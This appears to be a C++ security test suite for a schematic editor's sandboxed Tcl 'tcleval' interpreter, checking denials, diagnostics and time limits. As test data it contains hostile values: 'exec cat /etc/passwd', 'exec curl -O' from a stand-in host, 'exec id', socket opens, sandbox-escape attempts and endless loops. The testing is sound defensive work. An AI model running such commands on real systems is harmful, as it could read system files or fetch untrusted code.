// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 The Hefesto Authors
//
// Security review, task 12.1 (design D14): hostile `tcleval(...)` values in
// the session's sandboxed interpreter (schem/tcl TclEnvironment and
// TclBridge). Every denial SHALL give the sandbox diagnostic, naming what
// the value belongs to, and the value `?` LF (kTclFailure); an endless value
// SHALL stop (hangs are fixed in both modes of `xschem-compat`; TclBridge
// does not depend on the mode).
//
// Owner: SECURITY.

#include <catch2/catch_test_macros.hpp>

#include <algorithm>
#include <chrono>
#include <filesystem>
#include <string>

#include "hefesto/diag/sink.hpp"
#include "hefesto/editor/editor_state.hpp"
#include "hefesto/platform/file_system.hpp"
#include "hefesto/schem/tcl/tcl_bridge.hpp"
#include "hefesto/schem/tcl/tcl_environment.hpp"
#include "security_support.hpp"

namespace schem = hefesto::schem;
namespace diag = hefesto::diag;
namespace platform = hefesto::platform;
namespace script = hefesto::script;
namespace sec = hefesto::test::security;
using std::chrono::milliseconds;

namespace {

// The `tcleval` environment of a netlist run: the document folder readable,
// nothing else (as schem/cmd's tcleval_policy() without a project root).
struct Run {
  sec::TempFolder document;
  sec::TempFolder outside;
  hefesto::editor::EditorState editor;
  platform::LocalFileSystem files;
  diag::CollectingSink sink;
  schem::TclEnvironment tcl;

  explicit Run(bool writable_document = false) : tcl(editor, policy(document.path(), writable_document), files) {
    outside.write("evil.tcl", "set ::sourced 1\n");
    tcl.set_diagnostics(&sink);
  }

  static script::SandboxPolicy policy(const std::filesystem::path& folder, bool writable) {
    script::SandboxPolicy p;
    (writable ? p.granted_roots : p.read_only_roots).push_back(folder);
    return p;
  }

  std::string eval(const std::string& body) {
    schem::TclContext context;
    context.instname = "R1";
    context.symname = "evil.sym";
    context.owner = "instance R1 (evil.sym)";
    return tcl.bridge().evaluate("tcleval(" + body + ")", context);
  }
};

}  // namespace

// Regression (review finding S8-01): TclBridge::evaluate dropped the
// diagnostics of the evaluation with its result, so a denied `exec` in a
// symbol's `tcleval` value reached no log and named nothing ("Schematic
// script permission model", scenario "tcleval tries to read outside the
// granted folders": "denied with a sandbox diagnostic naming the symbol").
TEST_CASE("hostile tcleval values are denied with the sandbox diagnostic and ?", sec::kPermissionModel) {
  for (const sec::Hostile& hostile : sec::hostile_operations()) {
    INFO(hostile.name);
    Run run;
    const std::string body = "[" + sec::with_outside(hostile.script, run.outside.str()) + "]";
    CHECK(run.eval(body) == schem::kTclFailure);
    const auto denials = sec::with_code_prefix(run.sink.take(), "SCRIPT-SANDBOX-");
    REQUIRE(denials.size() == 1);
    CHECK(denials[0].code == hostile.code);
    CHECK(denials[0].text.ends_with(" (tcleval of instance R1 (evil.sym))"));
    CHECK_FALSE(std::filesystem::exists(run.outside.path() / "written"));
    CHECK_FALSE(std::filesystem::exists(run.outside.path() / "made"));
    CHECK(std::filesystem::exists(run.outside.path() / "evil.tcl"));
  }
}

TEST_CASE("tcleval tries to read outside the granted folders", sec::kPermissionModel) {
  Run run;
  CHECK(run.eval("[exec cat /etc/passwd]") == "?\n");
  const auto all = run.sink.take();
  REQUIRE(all.size() == 1);
  CHECK(all[0].code == "SCRIPT-SANDBOX-001");
  CHECK(all[0].text.find("evil.sym") != std::string::npos);
}

TEST_CASE("a denial the tcleval value catches is still reported", sec::kSandbox) {
  Run run;
  CHECK(run.eval("[catch {exec curl -O http://example.com/x}]") == "1");
  const auto denials = sec::with_code_prefix(run.sink.take(), "SCRIPT-SANDBOX-");
  REQUIRE(denials.size() == 1);
  CHECK(denials[0].code == "SCRIPT-SANDBOX-001");
  CHECK(denials[0].text.find("caught by the script's catch") != std::string::npos);
}

TEST_CASE("the owner of a tcleval value defaults to its symbol, then its instance", sec::kPermissionModel) {
  Run run;
  schem::TclContext context;
  context.symname = "evil.sym";
  CHECK(run.tcl.bridge().evaluate("tcleval([exec id])", context) == "?\n");
  context = {};
  context.instname = "R7";
  CHECK(run.tcl.bridge().evaluate("tcleval([exec id])", context) == "?\n");
  CHECK(run.tcl.bridge().evaluate("tcleval([exec id])", {}) == "?\n");
  const auto all = run.sink.take();
  REQUIRE(all.size() == 3);
  CHECK(all[0].text.ends_with("(tcleval of evil.sym)"));
  CHECK(all[1].text.ends_with("(tcleval of R7)"));
  CHECK(all[2].text == "exec: process execution is not permitted in the script sandbox");
}

// Regression (review finding S8-02): `write_data` reported a refused write
// only as its own error (SCHEM-TCL-001); the SCRIPT-SANDBOX-004 refusal of
// the sandboxed file system was lost with the native command's result.
TEST_CASE("write_data outside the writable folders is denied with the sandbox diagnostic", sec::kPermissionModel) {
  Run run;
  CHECK(run.eval("[write_data secret " + run.outside.str("w.txt") + "]") == "?\n");
  CHECK(run.eval("[write_data secret " + run.document.str("w.txt") + "]") == "?\n");  // read-only root
  CHECK_FALSE(std::filesystem::exists(run.outside.path() / "w.txt"));
  CHECK_FALSE(std::filesystem::exists(run.document.path() / "w.txt"));
  const auto denials = sec::with_code_prefix(run.sink.take(), "SCRIPT-SANDBOX-");
  REQUIRE(denials.size() == 2);
  CHECK(denials[0].code == "SCRIPT-SANDBOX-004");
  CHECK(denials[0].text.ends_with("(tcleval of instance R1 (evil.sym))"));
  CHECK(denials[1].code == "SCRIPT-SANDBOX-004");
  // Under a granted (writable) root the write is allowed, as for any script.
  Run writable(true);
  CHECK(writable.eval("[write_data ok " + writable.document.str("w.txt") + "]").empty());
  CHECK(std::filesystem::exists(writable.document.path() / "w.txt"));
  CHECK(writable.sink.take().empty());
}

TEST_CASE("a safe child interpreter has no way out of the sandbox", sec::kSandbox) {
  Run run;
  CHECK(run.eval("[interp create -safe s][s eval {exec id}]") == "?\n");
  CHECK(run.eval("[s eval {open /etc/hosts}]") == "?\n");
  CHECK(run.eval("[s eval {socket example.com 80}]") == "?\n");
  CHECK(run.tcl.interpreter().evaluate("info exists ::sourced").value.to_string() == "0");
}

TEST_CASE("the tcleval time limits", sec::kPermissionModel) {
  CHECK(schem::kTclevalTimeLimit == std::chrono::seconds{10});
  CHECK(schem::kTclevalTotalTimeLimit == std::chrono::seconds{60});
}

// Regression (review finding S8-03): a `tcleval` value had no time limit, so
// `tcleval([while 1 {}])` in a symbol hung every netlist run of a schematic
// that placed it. Each value now stops after kTclevalTimeLimit (here 200 ms)
// with SCHEM-TCL-003 and gives `?`; `catch`, `after` and `vwait` do not
// escape the limit.
TEST_CASE("an endless tcleval value is stopped", sec::kPermissionModel) {
  for (const std::string body : {"[while 1 {}]", "[while 1 {catch {while 1 {}}}]", "[after 600000]",
                                 "[vwait ::forever]"}) {
    INFO(body);
    Run run;
    run.tcl.set_time_limits(milliseconds{200}, milliseconds{60'000});
    const auto start = std::chrono::steady_clock::now();
    CHECK(run.eval(body) == "?\n");
    CHECK(std::chrono::steady_clock::now() - start < std::chrono::seconds{5});
    const auto all = run.sink.take();
    REQUIRE(all.size() == 1);
    CHECK(all[0].code == "SCHEM-TCL-003");
    CHECK(all[0].text == "tcleval value stopped after 200 ms (tcleval of instance R1 (evil.sym))");
    CHECK(run.eval("[expr {6 * 7}]") == "42");  // the next value runs normally
  }
}

// The values of one run share kTclevalTotalTimeLimit (here 500 ms): 10,000
// endless values would otherwise take 10,000 times the limit of one.
TEST_CASE("endless tcleval values share a total time limit", sec::kPermissionModel) {
  Run run;
  run.tcl.set_time_limits(milliseconds{200}, milliseconds{500});
  const auto start = std::chrono::steady_clock::now();
  for (int i = 0; i < 1000; ++i) CHECK(run.eval("[while 1 {}]") == "?\n");
  CHECK(std::chrono::steady_clock::now() - start < std::chrono::seconds{5});
  CHECK(run.eval("[expr 1]") == "?\n");  // nothing runs once the total is spent
  const auto all = run.sink.take();
  const auto stops = sec::with_code_prefix(all, "SCHEM-TCL-003");
  REQUIRE(stops.size() == all.size());
  REQUIRE(stops.size() >= 3);  // 200 + 200 + the 100 ms left, then the total
  CHECK(stops.back().text.starts_with("tcleval values ran for their total of 500 ms"));
  CHECK(std::count_if(stops.begin(), stops.end(),
                      [](const diag::Diagnostic& d) { return d.text.find("total") != std::string::npos; }) == 1);
  run.tcl.set_time_limits(milliseconds{200}, milliseconds{500});  // a new run starts again
  CHECK(run.eval("[expr 1]") == "1");
}
